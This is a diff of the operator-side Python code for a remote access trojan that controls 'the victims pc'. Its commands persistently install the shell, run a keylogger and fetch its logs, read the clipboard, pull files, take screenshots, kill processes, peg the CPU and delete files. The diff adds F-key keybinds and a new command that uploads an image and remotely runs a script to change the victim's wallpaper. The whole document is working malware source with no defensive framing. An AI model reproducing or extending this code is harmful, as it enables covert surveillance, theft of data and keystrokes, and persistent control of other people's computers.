@@ -24,7 +24,7 @@ session_ids = []
 COMMANDS = ["help", "sessions"]
 SESSION_COMMANDS = ["help", "back", "tree", "install", "matrix", "disconnect", "ps", "kill", "keylogger", "getlogs",
                     "keybind", "msg", "statlights", "delete", "uninstall", "ls", "whoami", "clipboard", "download",
-                    "screenshot", "cpu", "kermit", "url", "rmdir"]
+                    "screenshot", "cpu", "kermit", "url", "rmdir", "background"]
 
 
 class Commands:
@@ -153,24 +153,25 @@ class Commands:
                 return returned
             else:
                 return
-# ________________________________________________________________________________________________
+
+        # ________________________________________________________________________________________________
         # gets you back to the main menu
         if message == "back":
             mainMenu()
-# ________________________________________________________________________________________________
+        # ________________________________________________________________________________________________
         # prints the help message
         elif message == "help":
             print(self.helpmsg)
-# ________________________________________________________________________________________________
+        # ________________________________________________________________________________________________
         # shows the entire dir tree
         elif message == "tree":
             print(sendMessage("c o tree C:\\"))
-# ________________________________________________________________________________________________
+        # ________________________________________________________________________________________________
         # installs the shell persistently
         elif message == "install":
             with open("extraScripts/plain.py", "r") as file:
                 sendMessage(f"x{file.read()}")
-# ________________________________________________________________________________________________
+        # ________________________________________________________________________________________________
         # is a small bat script which makes random number appear in a cmd screen
         elif message == "matrix":
             if args:
@@ -193,11 +194,11 @@ class Commands:
                 print("you need an argument type 'help' for more")
             else:
                 print("Those are too many arguments only one is allowed type 'help' for more.")
-# ________________________________________________________________________________________________
+        # ________________________________________________________________________________________________
         # shows all tasks with pid
         elif message == "ps":
             print(sendMessage("c o tasklist"))
-# ________________________________________________________________________________________________
+        # ________________________________________________________________________________________________
         # kills task with given pid
         elif message == "kill":
             # taskkill /im
@@ -217,7 +218,7 @@ class Commands:
                 sendMessage(file.read())
             if receiveMessage() == "err":
                 print("You need to install the shell")
-# ________________________________________________________________________________________________
+        # ________________________________________________________________________________________________
         # gets the keylogger logs
         elif message == "getlogs":
             sendMessage("r C:/$SysStartup/temp/logs.txt")
@@ -232,7 +233,7 @@ class Commands:
                         return
             else:
                 print("Either wait for a logfile or install the keylogger.")
-# ________________________________________________________________________________________________
+        # ________________________________________________________________________________________________
         # deletes a file in given path
         elif message == "delete":
             if args:
@@ -242,7 +243,7 @@ class Commands:
                 print("You need a path type 'help' for more")
             else:
                 print("to many arguments type 'help' for more")
-# ________________________________________________________________________________________________
+        # ________________________________________________________________________________________________
         # uninstalls the whole shell
         elif message == "uninstall":
             user = sendMessage("c o echo %USERNAME%").strip()
@@ -253,7 +254,7 @@ class Commands:
             sendMessage("!dsc")
             conn.close()
             delete()
-# ________________________________________________________________________________________________
+        # ________________________________________________________________________________________________
         # sends a keybind
         elif message == "keybind":
             special_keys = {"ctrl": "Key.ctrl", "windows": "Key.cmd", "alt": "Key.alt_l", "alt_gr": "Key.alt_gr",
@@ -261,7 +262,9 @@ class Commands:
                             "caps": "Key.caps_lock", "num": "Key.num_lock", "shift": "Key.shift", "esc": "Key.esc",
                             "enter": "Key.enter",
                             "del": "Key.delete", "insert": "Key.insert", "tab": "Key.tab",
-                            "volDown": "Key.media_volume_down", "volUp": "Key.media_volume_up"}
+                            "volDown": "Key.media_volume_down", "volUp": "Key.media_volume_up", "f1": "Key.f1", "f2": "Key.f2",
+                            "f3": "Key.f3", "f4": "Key.f4", "f5": "Key.f5", "f6": "Key.f6", "f7": "Key.f7", "f8": "Key.f8", "f9": "Key.f9",
+                            "f10": "Key.f10", "f11": "Key.f11", "f12": "Key.f12"}
             # checks for arguments
             if args:
                 keysStr = args[0]
@@ -282,7 +285,7 @@ class Commands:
                 print("You need to type the keybinds type 'help' for more.")
             else:
                 print("Those are to many arguments type 'help' for more.")
-# ________________________________________________________________________________________________
+        # ________________________________________________________________________________________________
         # types a message into notepad
         elif message == "msg":
             if args:
@@ -293,7 +296,7 @@ class Commands:
                 sendMessage(f"k t {msg}")
             else:
                 print("You need atleast one letter for the message type 'help' for more")
-# ________________________________________________________________________________________________
+        # ________________________________________________________________________________________________
         # makes the keyboard status lights blink randomly
         elif message == "statlights":
             if args:
@@ -306,7 +309,7 @@ class Commands:
                 print("You need to write how many times to let the lights blink type 'help' for more")
             else:
                 print("Too many arguments type 'help' for more")
-# ________________________________________________________________________________________________
+        # ________________________________________________________________________________________________
         # shows the contents of a folder
         elif message == "ls":
             if args:
@@ -327,7 +330,7 @@ class Commands:
 
             elif not args:
                 print("You need specify a path type 'help' for more")
-# ________________________________________________________________________________________________
+        # ________________________________________________________________________________________________
         # basic whoami command
         elif message == "whoami":
             print(sendMessage("c o whoami"))
@@ -335,11 +338,11 @@ class Commands:
         # shows whats currently in the clipboard
         elif message == "clipboard":
             print(sendMessage("c o powershell Get-Clipboard"))
-# ________________________________________________________________________________________________
+        # ________________________________________________________________________________________________
         # downloads a file from given path
         elif message == "download":
             if args:
-                path = " ".join(args).replace("\\", "/").replace(" ", "")
+                path = " ".join(args).replace("\\", "/")
                 ending = path[path.rfind("."):]
                 drive = path[0].upper()
                 path = path[1:]
@@ -353,7 +356,6 @@ class Commands:
                     while download:
                         if download[-4:] != b"done":
                             with open(f"{name}{ending}", "ab") as file:
-                                print("receiving")
                                 file.write(download)
                             download = conn.recv(2048)
                         else:
@@ -362,7 +364,7 @@ class Commands:
                 print("You need to specify a path")
             else:
                 print("Too many argument type 'help' for more")
-# ________________________________________________________________________________________________
+        # ________________________________________________________________________________________________
         # takes a screenshot
         elif message == "screenshot":
             usersName = sendMessage("c o echo %USERNAME%").strip()
@@ -384,7 +386,7 @@ class Commands:
                 else:
                     sendMessage("c n del /f /Q C:\\Users\\Public\\monitor-1.png")
                     return
-# ________________________________________________________________________________________________
+        # ________________________________________________________________________________________________
         # makes the cpu go to 100%
         elif message == "cpu":
             if len(args) == 1:
@@ -414,7 +416,7 @@ class Commands:
                 print("You need to specify an argument type 'help' for more")
             else:
                 print("Too many arguments type 'help' for more")
-#________________________________________________________________________________________________
+        # ________________________________________________________________________________________________
         # dont ask
         elif message == "kermit":
             # gets the username for execution of the sendet scripts
@@ -473,15 +475,43 @@ class Commands:
                 print("You need to specify a path type 'help' for mora")
             else:
                 print("Only one argument is allowed type 'help' for more")
-# ________________________________________________________________________________________________
+        # ________________________________________________________________________________________________
         # change the background
-        if message == "background":
-            if len(args) == "1":
-                pass
+        elif message == "background":
+            if args:
+                username = sendMessage("c o echo %USERNAME%").strip()
+                path = " ".join(args).replace("\\", "/")
+                ending = path[path.rfind("."):]
+                sendMessage(f"b {ending}")
+                name = receiveMessage()
+                with open(f"{path}", "rb") as pic:
+                    frag = pic.read(2048)
+                    while frag:
+                        conn.send(frag)
+                        frag = pic.read(2048)
+                sleep(0.2)
+                conn.send("done".encode())
+                conn.send(f"C:\\Users/{username}/AppData/Local/Temp/".encode())
+                success = receiveMessage()
+                # edit script to the bg path
+                with open("extraScripts/bg.py", "r") as file:
+                    nString = file.read()
+                    string = nString.replace("%CHDIR%", f"C:\\\\\\\\Users\\\\\\\\{username}\\\\\\\\AppData\\\\\\\\Local\\\\\\\\Temp\\\\\\\\{name}")
+                    with open("extraScripts/bg.py", "w") as edit:
+                        edit.write(string)
+                # send the changing script
+                with open("extraScripts/bg.py", "r") as file:
+                    sendMessage(file.read())
+                scriptname = receiveMessage()
+                with open("extraScripts/bg.py", "w") as file:
+                    file.write(nString)
+                sleep(5)
+                sendMessage(f"c n python C:\\Users\\{username}\\AppData\\Local\\Temp\\{scriptname}")
+                return
             elif not args:
-                pass
+                print("you need to specify a path type 'help' for more")
             else:
-                pass
+                print("Too many arguments type 'help' for more")
         # disconnects and closes the shell script on the victims pc(if installed it will reconnect after restart of the victims pc)
         elif message == "disconnect":
             sendMessage("!dsc")
